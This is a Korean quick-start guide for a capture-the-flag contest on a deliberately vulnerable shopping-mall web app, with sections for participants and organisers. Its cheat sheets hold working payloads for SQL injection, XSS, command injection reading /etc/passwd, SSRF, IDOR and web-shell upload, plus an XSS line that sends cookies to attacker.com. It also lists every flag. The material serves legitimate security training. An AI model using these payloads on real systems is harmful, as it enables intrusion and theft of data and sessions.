# 🚀 CTF 빠른 시작 가이드

이 문서는 CTF 대회 참가자와 운영자를 위한 빠른 시작 가이드입니다.

---

## 📋 목차

1. [참가자용 가이드](#참가자용-가이드)
2. [운영자용 가이드](#운영자용-가이드)
3. [공격 치트시트](#공격-치트시트)
4. [플래그 위치](#플래그-위치)

---

## 🎮 참가자용 가이드

### 시작하기

1. **대회 URL 확인**
   ```
   http://[대회서버주소]:8080
   ```

2. **계정 생성** (필요한 경우)
   - 회원가입: `/joinForm.do`
   - 로그인: `/loginForm.do`

3. **취약점 찾기 시작!**

---

### 추천 공격 순서

#### Level 1: 초급 (50-100점)

**1. SQL Injection - 로그인 우회**
```
URL: /loginAction.do
Method: POST

Payload:
ID: admin' OR '1'='1' --
PW: anything

점수: 100점
```

**2. XSS - 게시판**
```
URL: /qna/openQnaWrite.do
Method: POST

Payload:
제목: <script>alert('XSS')</script>
내용: <img src=x onerror="alert(document.cookie)">

점수: 50점
```

#### Level 2: 중급 (80-150점)

**3. IDOR - 주문 정보 열람**
```
URL: /my_detail.do?order_no=999
Method: GET

순차적으로 order_no를 변경하여 다른 사용자 정보 확인

점수: 80점
```

**4. Command Injection**
```
URL: /checkPing.do?ping=127.0.0.1; cat /tmp/flag.txt
Method: GET

점수: 150점
```

#### Level 3: 고급 (100-120점)

**5. SSRF - 내부 네트워크 접근**
```
URL: /common/redirection.do?url=http://localhost:8080/admin/
Method: GET

점수: 100점
```

**6. File Upload - 웹쉘**
```
URL: /ckeditor/fileupload.do
Method: POST

shell.jsp 업로드 후 실행

점수: 120점
```

---

### 자동화 스크립트 사용

```bash
# SQL Injection
python attack_scripts/sql_injection.py http://target.com

# Command Injection
python attack_scripts/command_injection.py http://target.com

# IDOR Scanner
python attack_scripts/idor_scanner.py http://target.com 1 1000
```

---

### 플래그 형식

```
FLAG{[A-Za-z0-9_]+}

예시:
FLAG{SQL_M4st3r_2024}
FLAG{C0mm4nd_Pwn3r_2024}
FLAG{1D0R_Hunt3r_2024}
```

---

## 🛠️ 운영자용 가이드

### 환경 설정

#### 1. Docker로 실행 (권장)

```bash
# 이미지 빌드
docker build -t ctf-shoppingmall .

# 컨테이너 실행 (격리된 네트워크)
docker run -d \
  --name ctf-app \
  --network none \
  -p 8080:8080 \
  ctf-shoppingmall

# 특정 IP만 허용
iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP
```

#### 2. 데이터베이스 설정

```sql
-- 플래그 테이블 생성
CREATE TABLE SECRET_FLAGS (
    ID NUMBER PRIMARY KEY,
    FLAG VARCHAR2(100),
    HINT VARCHAR2(200),
    DIFFICULTY NUMBER
);

-- 플래그 삽입
INSERT INTO SECRET_FLAGS VALUES (1, 'FLAG{SQL_M4st3r_2024}', 'UNION 쿼리를 사용하세요', 1);
INSERT INTO SECRET_FLAGS VALUES (2, 'FLAG{DB_N1nj4_2024}', '숨겨진 테이블을 찾으세요', 2);

-- 특수 주문에 플래그 삽입
INSERT INTO ORDER_LIST (ORDER_NO, MEMBER_NO, ORDER_NAME, ORDER_PHONE, ORDER_ADDR1) 
VALUES (999, 1, 'FLAG{1D0R_Hunt3r_2024}', '010-0000-0000', 'CTF Street');

-- 관리자 계정
INSERT INTO MEMBER (MEMBER_ID, MEMBER_PASSWD, MEMBER_NAME, MEMBER_EMAIL) 
VALUES ('admin', 'admin123', 'Administrator', 'admin@ctf.com');
```

#### 3. 파일 시스템 플래그

```bash
# Command Injection 플래그
echo "FLAG{C0mm4nd_Pwn3r_2024}" > /tmp/flag_cmd.txt
chmod 644 /tmp/flag_cmd.txt

# 숨겨진 플래그
echo "FLAG{H1dd3n_F1l3_2024}" > /var/www/.secret_flag
chmod 644 /var/www/.secret_flag
```

---

### 모니터링 설정

#### 로그 수집

```bash
# 실시간 로그 모니터링
tail -f /var/log/tomcat/catalina.out | grep -E "FLAG|attack|injection"

# 접근 로그
tail -f /var/log/tomcat/access.log
```

#### 이상 행위 탐지

```bash
# 과도한 요청 감지
awk '{print $1}' /var/log/tomcat/access.log | sort | uniq -c | sort -rn | head -10

# SQL Injection 시도 감지
grep -i "union\|select\|or 1=1" /var/log/tomcat/catalina.out
```

---

### 자동 리셋

```bash
# crontab -e
# 매 시간 컨테이너 재시작
0 * * * * docker restart ctf-app

# 매 30분마다 데이터베이스 초기화
*/30 * * * * /path/to/reset_database.sh
```

**reset_database.sh:**
```bash
#!/bin/bash
sqlplus user/pass@db <<EOF
DELETE FROM ORDER_LIST WHERE ORDER_NO > 1000;
UPDATE MEMBER SET MEMBER_PASSWD = 'default123' WHERE MEMBER_ID != 'admin';
COMMIT;
EOF
```

---

### 점수 시스템

```
SQL Injection (로그인 우회): 100점
SQL Injection (데이터 추출): 150점
Command Injection: 150점
SSRF: 100점
XSS: 50점
IDOR: 80점
Session Fixation: 70점
File Upload: 120점

총점: 820점
```

---

## 🔥 공격 치트시트

### SQL Injection

```sql
-- 로그인 우회
admin' OR '1'='1' --
admin' OR 1=1 --
' OR '1'='1

-- 테이블 목록
' UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM USER_TABLES --

-- 데이터 추출
' UNION SELECT MEMBER_ID,MEMBER_PASSWD,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MEMBER --

-- 플래그 찾기
' UNION SELECT FLAG,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM SECRET_FLAGS --
```

### Command Injection

```bash
# 기본 명령어
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd

# 플래그 찾기
127.0.0.1; find / -name "*flag*" 2>/dev/null
127.0.0.1; cat /tmp/flag*.txt
127.0.0.1; grep -r "FLAG{" /tmp/

# 시스템 정보
127.0.0.1; uname -a
127.0.0.1; ps aux
127.0.0.1; netstat -an
```

### SSRF

```
# 내부 서비스 접근
url=http://localhost:8080/admin/
url=http://127.0.0.1:8080/secret/

# 포트 스캔
url=http://localhost:22/
url=http://localhost:3306/
url=http://localhost:6379/

# 파일 읽기
url=file:///etc/passwd
url=file:///tmp/flag.txt
```

### XSS

```html
<!-- 기본 -->
<script>alert('XSS')</script>

<!-- 쿠키 탈취 -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- 이미지 태그 -->
<img src=x onerror="alert(document.cookie)">

<!-- SVG -->
<svg onload="alert('XSS')">
```

### IDOR

```
# 순차 접근
/my_detail.do?order_no=1
/my_detail.do?order_no=2
/my_detail.do?order_no=3

# 특수 번호
/my_detail.do?order_no=999
/my_detail.do?order_no=1337
/my_detail.do?order_no=9999
```

### File Upload

```jsp
<!-- shell.jsp -->
<%@ page import="java.io.*" %>
<%
                                                                                                                                                                                                                                                                                                           
%>
```

---

## 📍 플래그 위치

### 데이터베이스
```
테이블: SECRET_FLAGS
컬럼: FLAG
플래그: FLAG{SQL_M4st3r_2024}
```

### 파일 시스템
```
경로: /tmp/flag_cmd.txt
플래그: FLAG{C0mm4nd_Pwn3r_2024}
```

### 주문 정보
```
주문번호: 999
주문자명: FLAG{1D0R_Hunt3r_2024}
```

### 관리자 페이지
```
URL: http://localhost:8080/admin/flag
플래그: FLAG{SSRF_M4st3r_2024}
```

### 쿠키
```
관리자 세션 쿠키에 플래그 포함
ADMIN_FLAG=FLAG{XSS_C00k13_2024}
```

---

## 🎯 힌트 시스템

### Level 1 힌트
```
Q: 로그인이 안 돼요!
A: SQL 쿼리에서 특수문자를 사용해보세요. 주석은 '--' 입니다.

Q: 게시판에 스크립트를 넣었는데 실행이 안 돼요!
A: <script> 태그 외에도 <img>, <svg> 등 다양한 태그를 시도해보세요.
```

### Level 2 힌트
```
Q: 다른 사람의 주문을 어떻게 보나요?
A: URL의 order_no 파라미터를 변경해보세요. 특별한 숫자가 있을 수 있습니다.

Q: 서버 관리 페이지는 어디에 있나요?
A: /admin/ 경로를 확인해보세요. 또는 SSRF를 이용해 내부 접근을 시도하세요.
```

### Level 3 힌트
```
Q: 플래그 파일을 어떻게 찾나요?
A: find 명령어로 전체 시스템을 검색하거나, /tmp 디렉토리를 확인하세요.

Q: 웹쉘을 어떻게 업로드하나요?
A: 에디터의 파일 업로드 기능을 찾아보세요. 파일 타입 검증이 없을 수 있습니다.
```

---

## 📞 지원

### 참가자 지원
- 기술적 문제: support@ctf.com
- 힌트 요청: hints@ctf.com
- 규칙 문의: rules@ctf.com

### 운영자 지원
- 시스템 문제: admin@ctf.com
- 긴급 상황: emergency@ctf.com

---

## ⚖️ 규칙

1. **허용된 공격만 수행**
   - 웹 애플리케이션 취약점 공격만 허용
   - 인프라 공격 금지 (DDoS, 브루트포스 등)

2. **다른 참가자 방해 금지**
   - 데이터 삭제 금지
   - 서비스 중단 시도 금지

3. **플래그 공유 금지**
   - 발견한 플래그는 본인만 제출
   - 다른 참가자에게 힌트 제공 금지

4. **자동화 도구 사용 제한**
   - 과도한 요청 금지 (초당 10회 이하)
   - 제공된 스크립트 사용 권장

---

**Good Luck! 🎯**
